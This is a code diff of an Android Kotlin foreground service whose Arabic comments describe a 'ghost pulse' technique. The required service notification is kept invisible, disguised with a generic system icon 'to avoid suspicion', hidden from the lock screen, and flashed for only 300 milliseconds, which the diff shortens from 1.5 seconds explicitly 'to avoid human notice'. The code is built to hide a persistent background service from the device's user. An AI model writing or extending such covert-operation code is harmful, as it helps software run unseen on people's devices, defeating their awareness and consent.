@@ -20,7 +20,7 @@ import androidx.core.app.NotificationCompat
  * استراتيجية النبض الشبحي (Ghost Pulse):
  * - الإشعار الأساسي بأولوية IMPORTANCE_MIN (مخفي تماماً في شريط الحالة)
  * - setOngoing(true) يبقى مفعلاً طوال الوقت لمنع قتل الخدمة
- * - عند استلام PULSE_ACTION، يظهر الإشعار بأولوية DEFAULT لمدة 1.5 ثانية ثم يعود للشبحية
+ * - عند استلام PULSE_ACTION، يظهر الإشعار بأولوية DEFAULT لمدة 0.3 ثانية ثم يعود للشبحية
  * - أيقونة نظامية عامة (ic_popup_sync أو ic_menu_compass) لتجنب الشك
  * - إخفاء المحتوى من شاشة القفل
  * - لا يتم إلغاء الإشعار نهائياً للحفاظ على حالة "الأمامية" للخدمة
@@ -32,6 +32,7 @@ import androidx.core.app.NotificationCompat
  * ✅ تم إصلاح ForegroundServiceDidNotStartInTimeException
  *   باستخدام startForeground مع النوع الصحيح (FOREGROUND_SERVICE_TYPE_DATA_SYNC)
  *   وإبقاء الإشعار حياً بشكل شبحى (غير مرئي)
+ * ✅ تم تقليل مدة ظهور النبض إلى 300 مللي ثانية فقط لتفادي الملاحظة البشرية
  */
 class ForegroundService : Service() {
 
@@ -57,12 +58,12 @@ class ForegroundService : Service() {
             return START_NOT_STICKY
         }
 
-        // ✅ نبض: عند استلام أمر، يظهر الإشعار لـ 1.5 ثانية ثم يعود للشبحية
+        // ✅ نبض: عند استلام أمر، يظهر الإشعار لمدة 0.3 ثانية ثم يعود للشبحية
         if (intent?.action == "PULSE_ACTION") {
             startGhostForeground(isPulse = true)
             mainHandler.postDelayed({
                 startGhostForeground(isPulse = false)
-            }, 1500) // 1.5 ثانية كافية ليظهر ويختفي دون ملاحظة بشرية
+            }, 300) // 0.3 ثانية فقط – أجزاء من الثانية لاختفاء فوري دون ملاحظة بشرية
             return START_STICKY
         }
 
@@ -129,7 +130,7 @@ class ForegroundService : Service() {
 
             isForeground = true
 
-            val logMsg = if (isPulse) "✅ Ghost notification pulsed (visible)" else "✅ Ghost notification started (permanent invisible)"
+            val logMsg = if (isPulse) "✅ Ghost notification pulsed (visible for 300ms)" else "✅ Ghost notification started (permanent invisible)"
             MainActivity.appendLogStatic(logMsg)
             Log.d(TAG, logMsg)
 
